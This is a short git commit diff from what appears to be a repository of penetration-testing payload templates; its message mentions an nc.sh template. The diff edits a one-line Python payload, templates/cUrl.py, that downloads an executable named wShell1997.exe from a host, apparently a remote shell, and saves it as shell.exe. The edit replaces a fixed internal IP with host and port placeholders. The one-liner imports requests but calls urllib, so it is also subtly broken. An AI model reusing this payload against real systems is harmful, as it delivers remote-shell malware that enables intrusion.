0fe89dc16dfcf4aa6d0bbc25e597eabb41739f95
Luke Stephens <luke@lukejstephens.com>
2018-02-08 14:21:21 +1100

    Added nc.sh and fixed cUrl.py

--- templates/cUrl.py
+++ templates/cUrl.py
@@ -1,1 +1,1 @@
-"import requests; urllib.urlretrieve('http://10.11.0.65:8000/wShell1997.exe', 'shell.exe')"
+"import requests; urllib.urlretrieve('http://{{ host.ip }}:{{ host.port }}/wShell1997.exe', 'shell.exe')"
